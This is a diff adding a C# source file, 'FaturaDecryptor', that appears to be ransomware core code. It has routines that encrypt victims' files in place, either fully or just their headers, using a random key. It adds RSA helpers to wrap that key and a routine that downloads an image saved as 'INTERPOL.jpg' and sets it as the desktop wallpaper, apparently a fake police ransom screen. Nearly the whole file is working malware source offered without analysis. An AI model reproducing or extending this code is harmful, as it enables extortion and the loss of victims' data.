@@ -1,0 +1,261 @@
+using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using Microsoft.Win32;
+
+namespace FaturaDecryptor;
+
+internal class FaturaClass
+{
+	public sealed class Wallpaper
+	{
+		public enum Style
+		{
+			Tiled,
+			Centered,
+			Stretched
+		}
+
+		private const int SPI_SETDESKWALLPAPER = 20;
+
+		private const int SPIF_UPDATEINIFILE = 1;
+
+		private const int SPIF_SENDWININICHANGE = 2;
+
+		private Wallpaper()
+		{
+		}
+
+		[DllImport("user32.dll", CharSet = CharSet.Auto)]
+		private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+		public static void Set(Uri uri, Style style)
+		{
+			Image obj = Image.FromStream(new WebClient().OpenRead(uri.ToString()));
+			string text = Path.Combine(Path.GetTempPath(), "INTERPOL.jpg");
+			obj.Save(text, ImageFormat.get_Bmp());
+			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
+			if (style == Style.Stretched)
+			{
+				registryKey.SetValue("WallpaperStyle", 2.ToString());
+				registryKey.SetValue("TileWallpaper", 0.ToString());
+			}
+			if (style == Style.Centered)
+			{
+				registryKey.SetValue("WallpaperStyle", 1.ToString());
+				registryKey.SetValue("TileWallpaper", 0.ToString());
+			}
+			if (style == Style.Tiled)
+			{
+				registryKey.SetValue("WallpaperStyle", 1.ToString());
+				registryKey.SetValue("TileWallpaper", 1.ToString());
+			}
+			SystemParametersInfo(20, 0, text, 3);
+		}
+	}
+
+	private readonly Random _rnd = new Random();
+
+	private readonly bool _optimalAsymmetricEncryptionPadding;
+
+	public string EncryptionKey { get; private set; }
+
+	public FaturaClass()
+	{
+		EncryptionKey = GenerateRandomString(20);
+	}
+
+	public FaturaClass(string encryptionKey)
+	{
+		EncryptionKey = encryptionKey;
+	}
+
+	public void GenerateKeys(int keySize, out string publicKey, out string publicAndPrivateKey)
+	{
+		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
+		publicKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
+		publicAndPrivateKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true);
+	}
+
+	public byte[] RsaEncryption(byte[] data, int keySize, string publicKeyXml)
+	{
+		if (data != null && data.Length != 0)
+		{
+			int maxDataLength = GetMaxDataLength(keySize);
+			if (data.Length > maxDataLength)
+			{
+				throw new ArgumentException($"Maximum data length is {maxDataLength}", "data");
+			}
+			if (!IsKeySizeValid(keySize))
+			{
+				throw new ArgumentException("Key size is not valid", "keySize");
+			}
+			if (string.IsNullOrEmpty(publicKeyXml))
+			{
+				throw new ArgumentException("Key is null or empty", "publicKeyXml");
+			}
+			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
+			rSACryptoServiceProvider.FromXmlString(publicKeyXml);
+			return rSACryptoServiceProvider.Encrypt(data, _optimalAsymmetricEncryptionPadding);
+		}
+		throw new ArgumentException("Data are empty", "data");
+	}
+
+	public byte[] RsaDecryption(byte[] data, int keySize, string publicAndPrivateKeyXml)
+	{
+		if (data != null && data.Length != 0)
+		{
+			if (!IsKeySizeValid(keySize))
+			{
+				throw new ArgumentException("Key size is not valid", "keySize");
+			}
+			if (string.IsNullOrEmpty(publicAndPrivateKeyXml))
+			{
+				throw new ArgumentException("Key is null or empty", "publicAndPrivateKeyXml");
+			}
+			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
+			rSACryptoServiceProvider.FromXmlString(publicAndPrivateKeyXml);
+			return rSACryptoServiceProvider.Decrypt(data, _optimalAsymmetricEncryptionPadding);
+		}
+		throw new ArgumentException("Data are empty", "data");
+	}
+
+	public void EncryptFileFully(string filePath)
+	{
+		Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
+		byte[] array = new byte[stream.Length];
+		using (BinaryReader binaryReader = new BinaryReader(stream))
+		{
+			using BinaryWriter binaryWriter = new BinaryWriter(stream);
+			binaryReader.BaseStream.Position = 0L;
+			array = binaryReader.ReadBytes((int)stream.Length);
+			binaryWriter.BaseStream.Position = 0L;
+			array = EncodeAob(array, GetBytes(EncryptionKey));
+			binaryWriter.Write(array);
+		}
+		stream.Close();
+		stream.Dispose();
+	}
+
+	public void DecryptFileFully(string filePath)
+	{
+		Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
+		byte[] array = new byte[stream.Length];
+		using (BinaryReader binaryReader = new BinaryReader(stream))
+		{
+			using BinaryWriter binaryWriter = new BinaryWriter(stream);
+			binaryReader.BaseStream.Position = 0L;
+			array = binaryReader.ReadBytes((int)stream.Length);
+			binaryWriter.BaseStream.Position = 0L;
+			array = DecodeAob(array, GetBytes(EncryptionKey));
+			binaryWriter.Write(array);
+		}
+		stream.Close();
+		stream.Dispose();
+	}
+
+	public void EncryptFilePartially(string filePath)
+	{
+		Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
+		byte[] array = new byte[1024];
+		using (BinaryReader binaryReader = new BinaryReader(stream))
+		{
+			using BinaryWriter binaryWriter = new BinaryWriter(stream);
+			binaryReader.BaseStream.Position = 0L;
+			array = binaryReader.ReadBytes(1024);
+			binaryWriter.BaseStream.Position = 0L;
+			array = EncodeAob(array, GetBytes(EncryptionKey));
+			binaryWriter.Write(array);
+		}
+		stream.Close();
+		stream.Dispose();
+	}
+
+	public void DecryptFilePartially(string filePath)
+	{
+		Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
+		byte[] array = new byte[1024];
+		using (BinaryReader binaryReader = new BinaryReader(stream))
+		{
+			using BinaryWriter binaryWriter = new BinaryWriter(stream);
+			binaryReader.BaseStream.Position = 0L;
+			array = binaryReader.ReadBytes(1024);
+			binaryWriter.BaseStream.Position = 0L;
+			array = DecodeAob(array, GetBytes(EncryptionKey));
+			binaryWriter.Write(array);
+		}
+		stream.Close();
+		stream.Dispose();
+	}
+
+	private byte[] EncodeAob(byte[] aobToEncode, byte[] passwordBytes)
+	{
+		byte[] array = new byte[aobToEncode.Length];
+		int num = 0;
+		for (int i = 0; i < aobToEncode.Length; i++)
+		{
+			array[i] = (byte)(aobToEncode[i] + passwordBytes[num]);
+			num = ((passwordBytes[num + 1] != 0) ? (num + 1) : 0);
+		}
+		return array;
+	}
+
+	private byte[] DecodeAob(byte[] aobToDecode, byte[] passwordBytes)
+	{
+		byte[] array = new byte[aobToDecode.Length];
+		int num = 0;
+		for (int i = 0; i < aobToDecode.Length; i++)
+		{
+			array[i] = (byte)(aobToDecode[i] - passwordBytes[num]);
+			num = ((passwordBytes[num + 1] != 0) ? (num + 1) : 0);
+		}
+		return array;
+	}
+
+	private string GenerateRandomString(int length)
+	{
+		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+		string text2 = "";
+		for (int i = 0; i < length; i++)
+		{
+			text2 += text[_rnd.Next(text.Length)];
+		}
+		return text2;
+	}
+
+	private int GetMaxDataLength(int keySize)
+	{
+		if (_optimalAsymmetricEncryptionPadding)
+		{
+			return (keySize - 384) / 8 + 7;
+		}
+		return (keySize - 384) / 8 + 37;
+	}
+
+	private bool IsKeySizeValid(int keySize)
+	{
+		if (keySize >= 384 && keySize <= 16384)
+		{
+			return keySize % 8 == 0;
+		}
+		return false;
+	}
+
+	private byte[] GetBytes(string str)
+	{
+		byte[] array = new byte[str.Length * 2];
+		Buffer.BlockCopy(str.ToCharArray(), 0, array, 0, array.Length);
+		return array;
+	}
+
+	private string GetString(byte[] bytes)
+	{
+		char[] array = new char[bytes.Length / 2];
+		Buffer.BlockCopy(bytes, 0, array, 0, bytes.Length);
+		return new string(array);
+	}
+}
